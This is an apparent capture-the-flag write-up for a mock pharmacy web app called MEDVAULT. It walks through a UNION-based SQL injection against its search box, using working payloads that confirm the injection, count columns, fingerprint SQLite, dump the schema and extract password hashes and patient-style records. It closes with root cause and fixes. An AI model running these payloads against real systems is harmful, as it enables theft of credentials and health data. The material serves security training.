# MEDVAULT — "HIPAA compliant, RIGHT?"

- **Category:** Web
- **Target:** `https://18.215.143.250:5000` (mirror 2: `https://18.145.136.91:5000`)
- **App:** MEDVAULT `v2.1.0` — "Rx Inventory" medication search
- **Vuln:** UNION-based SQL injection in the search parameter (SQLite backend)
- **Flag:** `FLAG{__REPLACE_ME__}`  _(recovered from the `users` table)_

---

## Prompt

> A healthcare system, so it's HIPAA compliant right? RIGHT?

Two mirrors, port 5000, HTTPS. A provided photo showed the app logged in: a
MEDVAULT "Rx Inventory" page with a single search box ("Search prescription
medications by name") returning a table of `ID | MEDICATION | NDC | CATEGORY |
QTY`. The desk in the photo was covered in PHI props (lab reports, EOB, visit
summaries) and a sticky note with the login hint.

## Access notes

- The box only answered the player's own host. A sandboxed shell and a separate
  automation browser both got TCP connect timeouts on both mirrors / all ports.
  Everything below was run from Safari's JavaScript console against the live
  session (same-origin `fetch`, cookies included).
- **Login gate.** Credentials came straight off the sticky note in the photo:
  - username: `skim`
  - password: `PharmD#2026!`  (note read as "PharmD #2026!", not `...20261`)
  - session role shown: `pharmacy // site-3`

## Recon

The search form is a plain GET:

```
action = /
method = GET
field  = q
```

So every probe is just `GET /?q=<payload>` and we parse the returned HTML table.

## Step 1 — confirm injection

```
q = ' OR '1'='1
```

Returned **all** inventory rows (11) instead of a filtered match. Classic boolean
injection confirmed. Error output was suppressed, so we went straight to UNION.

## Step 2 — column count + render positions

```
q = x' UNION SELECT 1,2,3,4,5-- -
```

Returned a row `1 | 2 | 3 | 4 | 5`. The query exposes **5 columns**, and columns
**2, 3, 4** (Medication / NDC / Category) render as text — our output channels.

Backend fingerprint:

```
q = x' UNION SELECT 1,sqlite_version(),3,4,5-- -   ->  3.46.1   (SQLite)
```

`information_schema` / `version()` payloads returned nothing, consistent with SQLite.

## Step 3 — dump the schema

```
q = x' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'-- -
```

Tables recovered:

| Table | Notable columns |
| --- | --- |
| `inventory` | name, ndc, category, quantity, price |
| `patients` | first/last name, DOB, phone, email, address, allergies (**PHI**) |
| `prescriptions` | prescriber, dosage, rx_number, patient_id |
| `insurance_claims` | payer, bin_number, pcn, group_id, member_id, amounts (**PHI**) |
| `users` | username, **password_hash**, full_name, role, email |

The whole challenge is "a logged-in pharmacy user can read the entire PHI
database (and the user table) through one search box" — exactly the HIPAA failure
the prompt mocks.

## Step 4 — loot

Dump the `users` table (where the flag was planted):

```
q = x' UNION SELECT id, username||' | '||role||' | '||full_name, password_hash, email, id FROM users-- -
```

The flag was in a `users` row. Patients and insurance_claims dump the same way
(see `solves/medvault/exploit.js`) and spill full PHI — name, DOB, address,
allergies, insurance member IDs.

## Root cause

The search endpoint concatenates the `q` parameter straight into a SQL string
(`... WHERE name LIKE '%<q>%'` style) with no parameterization and no row-level
authorization. Any authenticated user reaches every table via `UNION SELECT`.

**Fix:** parameterized queries (bound `?` placeholders), least-privilege DB
access per view, and don't colocate PHI + credentials behind one unscoped search.
